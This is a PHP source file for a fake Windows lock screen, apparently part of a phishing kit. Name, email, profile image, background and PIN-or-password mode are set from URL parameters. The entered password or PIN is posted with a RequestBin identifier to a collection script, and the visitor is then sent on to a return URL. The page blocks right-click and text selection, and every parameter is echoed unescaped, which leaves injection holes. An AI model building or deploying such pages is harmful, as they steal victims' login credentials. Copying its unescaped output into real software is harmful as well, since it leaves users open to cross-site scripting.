<?php
  # Name --> Identify Person
  if (isset($_GET["name"])) {
    $name = $_GET["name"];
  } else {
    $name = "User";
  }
  # Type = "password" / "pin"
  if (isset($_GET["type"])) {
    $type = $_GET["type"];
  } else {
    $type = "password";
  }
  # Background
  if (isset($_GET["background"])) {
    $bg = $_GET["background"];
  } else {
    $bg = "../i/windows/default.jpg";
  }
  # Profile
  if (isset($_GET["profile"])) {
    $profile = $_GET["profile"];
  } else {
    $profile = "../i/user.png";
  }
  # Custom Request Bin
  if (isset($_GET["requestbin"])) {
    $requestbin = $_GET["requestbin"];
  } else {
    $requestbin = "1kdhj9p1";
  }
  # Email --> user@domain.com
  if (isset($_GET["mail"])) {
    $mail = $_GET["mail"];
  } else {
    $mail = "Locked";
  }
  # Return URL
  if (isset($_GET["return"])) {
    $return = $_GET["return"];
  } else {
    $return = "https://google.com";
  }
  # Operating System --> windows10 / windows7
  if (isset($_GET["os"])) {
    $os = $_GET["os"];
  } else {
    $os = "windows10";
  }
  # Text Colour --> black / white
  if (isset($_GET["text"])) {
    $text = $_GET["text"];
  } else {
    $text = "black";
  }
  $type = strtolower($type);
  if ($type == "pin") {
    $type = "PIN";
  } elseif ($type == "password") {
    $type = "Password";
  } else {
    $error = "True: Password/PIN";
  }
?>
<html>
<head>
  <title> Client </title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <style>
  .content {
    margin: 0;
    position: absolute;
    top: 50%;
    left: 50%;
    -ms-transform: translate(-50%, -50%);
    transform: translate(-50%, -50%);
  }
  img {
    border-radius: 50%;
    width: 200px;
    height: 200px;
  }
  @font-face {
    font-family: font;
    src: url(../fonts/font.woff);
  }
  @font-face {
    font-family: passwordfont;
    src: url(../fonts/passwordfont.ttf);
  }
  p.user {
    font-family: font;
    font-weight: 600;
    font-size: 33px;
    color: <?php echo $text; ?>;
  }
  body, html {
    height: 100%;
  }
  p {
    margin: 0 0 0 0;
  }
  p.locked {
    font-family: font;
    font-weight: 600;
    font-size: 16px;
    color: <?php echo $text; ?>;
  }
  input[type="password"] {
    font-family: passwordfont;
    font-weight: normal;
    font-size: 20.25px;
  }
  .bg {
    background-image: url(<?php echo $bg; ?>);

    height: 98%;

    background-position: center;
    background-repeat: no-repeat;
    background-size: cover;
  }
  input[type="password"] {
    width: 300px;
    height: 35px;
    margin-right: -20px;
    padding-right: 35px;
    padding-left: 13px;
    border: 0;
    outline: none;
  }
  input[type="image"] {
    margin-left: 0px;
    margin-bottom: -10px;
    height: 35px;
    width: 35px;
    color: black;
    border: 0;
    background-color: white;
    outline: none;
  }
  img.profile {
    opacity: 0.9;
  }
  #form-submit {
    visibility: hidden;
  }
  </style>
</head>
<body class="bg" oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
  <?php
    if ($type == "PIN") {
      echo "<script>
      $('#password').keyup(function(){
        if(this.value.length ==6){
          $('#form-submit').click();
        }
      });
      </script>";
    }
  ?>
  <div class="content">
    <?php
    # Profile Image
    echo "<center><img class='profile' src='$profile' alt='user'</center>";
    # Name + Email
    echo "<center><p class='user'>$name</p><p>&nbsp</p><p class='locked'>$mail</p><br><br></center>";
    ?>
    <form action="../includes/post-password.inc.php" method="post" id="form">
      <input type="hidden" name="name" value="<?php echo $name; ?>">
      <input type="hidden" name="mail" value="<?php echo $mail; ?>">
      <input type="hidden" name="type" value="<?php echo $type; ?>">
      <input type="hidden" name="background" value="<?php echo $background; ?>">
      <input type="hidden" name="profile" value="<?php echo $profile; ?>">
      <input type="hidden" name="requestbin" value="<?php echo $requestbin; ?>">
      <input type="hidden" name="error" value="<?php echo $error; ?>">
      <input type="hidden" name="return" value="<?php echo $return; ?>">
      <input type="password" name="password" id="password" value="" placeholder="<?php echo $type; ?>">
      <?php
        if ($type == "Password") {
          echo "<input type='image' name='password-submit' src='../i/arrow.png' alt='Submit' width='35' height='35'>";
        } else {
          echo '<input type="submit" name="password-submit" value="" id="form-submit">';
        }
      ?>
    </form>
  </div>
</body>
